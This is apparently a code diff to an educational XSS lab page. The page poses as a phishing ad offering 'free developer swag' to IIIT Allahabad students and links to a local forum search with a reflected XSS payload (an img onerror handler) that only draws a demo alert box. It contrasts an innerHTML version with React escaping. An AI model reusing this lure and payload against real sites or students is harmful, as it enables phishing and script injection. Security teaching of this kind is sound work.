@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Apex Innovations: Campus Fellowship Portal</title>
+  <title>Apex Innovations: Free Developer Swag Giveaway</title>
   <style>
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -132,34 +132,35 @@
 <body>
   <div class="portalCard">
     <div>
-      <span class="adBadge">Disguised Phishing Ad</span>
+      <span class="adBadge">Disguised Giveaway Ad</span>
       <span class="securityBadge">Reflected XSS Delivery</span>
     </div>
-    <h1>Apex Innovations: Campus Fellowship Opportunities</h1>
+    <h1>Claim Free Student Developer Swag Kit & AI Credits!</h1>
     <p>
-      Congratulations IIIT Allahabad Engineering Scholars. Apex Innovations has released 2026 open source project stipends. Click below to search approved project opportunities directly through your campus forum search engine.
+      Congratulations IIIT Allahabad Engineering Scholars. Apex Innovations has sponsored 200 complimentary student swag kits. Click below to verify your student account and claim your developer bundle.
     </p>
 
     <div class="offerBox">
-      <div class="offerTitle">Fellowship Program Details:</div>
+      <div class="offerTitle">Free Student Perks Package:</div>
       <div class="offerDetails">
-        Grant Value: Rs. 45,000 per approved student project<br>
-        Eligibility: Registered IIIT-A Open Source Society contributors<br>
-        Verification Mechanism: Direct search query parameter reflection
+        Swag Bundle: Mechanical Keyboard, Community Hoodie, Sticker Pack<br>
+        Cloud Perk: 100 OpenAI API Compute Tokens<br>
+        Eligibility: Authenticated IIIT Allahabad Community Forum Members<br>
+        Verification: Automated forum search query parameter reflection
       </div>
     </div>
 
     <!-- Phishing Link carrying the Reflected XSS Payload -->
     <a id="phishingLink" href="#" class="claimBtn">
-      Search Stipend Openings on IIIT-A Forum (Triggers Reflected XSS) →
+      Claim Free Developer Swag Kit Now (Triggers Reflected XSS) →
     </a>
 
     <div class="auditBox">
       <div class="auditTitle">Educational Security Laboratory Context:</div>
       <p style="margin: 0; font-size: 12.5px; color: #94a3b8;">
-        Reflected Cross Site Scripting (XSS) occurs when an attacker crafts a malicious link containing executable code within a request parameter and tricks a victim into clicking it via phishing or disguised advertisements. When clicked, the application reads the query parameter from the URL and reflects it directly into the DOM without escaping.
+        Reflected Cross Site Scripting (XSS) relies on social engineering or phishing where an attacker disguises an exploit as a free perk or giveaway. When the victim clicks the link, the browser is directed to the forum search page with an unescaped script payload inside the query parameter. In Version 1, the parameter is rendered into innerHTML, executing arbitrary script. In Version 2, React framework auto-escaping renders inert text safely.
       </p>
-      <div class="codeSnippet">Phishing Vector: Disguised fellowship stipend search ad
+      <div class="codeSnippet">Phishing Vector: Disguised free swag giveaway ad
 Parameter Injected: ?search=&lt;img src="x" onerror="..." /&gt;
 V1 Result: Reflected directly into innerHTML, executing arbitrary script
 V2 Result: React framework text auto-escaping renders inert text safely</div>
@@ -169,7 +170,7 @@ V2 Result: React framework text auto-escaping renders inert text safely</div>
   <script>
     //This does configure dynamic phishing link targeting current forum port with payload.
     var currentPort = window.location.port || '3000';
-    var payload = '<img src="x" onerror="(function(el){var b=document.createElement(\'div\');b.id=\'reflectedXssAlertBox\';b.style=\'margin:14px 0;padding:16px;background:linear-gradient(135deg,#7f1d1d,#991b1b);border:2px solid #ef4444;border-radius:10px;color:#fef2f2;box-shadow:0 8px 20px rgba(239,68,68,0.3);\';b.innerHTML=\'<div style=\\\'display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;\\\'><span style=\\\'background:#ef4444;color:#fff;font-size:10px;padding:3px 8px;border-radius:12px;font-weight:800;text-transform:uppercase;\\\'>Reflected XSS Executed</span><span style=\\\'font-size:11px;color:#fca5a5;\\\'>Delivered via Phishing Ad</span></div><h4 style=\\\'margin:0 0 4px 0;font-size:14px;color:#fff;\\\'>Search Parameter Code Execution Succeeded</h4><p style=\\\'margin:0;font-size:12px;color:#fee2e2;\\\'>The victim clicked a disguised search sponsorship ad. The unescaped search parameter was rendered directly into the DOM via innerHTML without sanitization.</p>\';el.parentNode.appendChild(b);})(this)" />';
+    var payload = '<img src="x" onerror="(function(el){var b=document.createElement(`div`);b.id=`reflectedXssAlertBox`;b.style=`margin:14px 0;padding:16px;background:linear-gradient(135deg,#7f1d1d,#991b1b);border:2px solid #ef4444;border-radius:10px;color:#fef2f2;box-shadow:0 8px 20px rgba(239,68,68,0.3);`;b.innerHTML=`<div style=&quot;display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;&quot;><span style=&quot;background:#ef4444;color:#fff;font-size:10px;padding:3px 8px;border-radius:12px;font-weight:800;text-transform:uppercase;&quot;>Reflected XSS Executed</span><span style=&quot;font-size:11px;color:#fca5a5;&quot;>Delivered via Free Swag Phishing Ad</span></div><h4 style=&quot;margin:0 0 4px 0;font-size:14px;color:#fff;&quot;>Search Parameter Code Execution Succeeded</h4><p style=&quot;margin:0;font-size:12px;color:#fee2e2;&quot;>The victim clicked a disguised \'Claim Free Developer Swag\' ad. The malicious search parameter was rendered directly into the DOM via innerHTML without sanitization.</p>`;el.parentNode.appendChild(b);})(this)" />';
     var targetUrl = window.location.protocol + '//' + window.location.hostname + ':' + currentPort + '/?search=' + encodeURIComponent(payload);
     document.getElementById('phishingLink').href = targetUrl;
   </script>
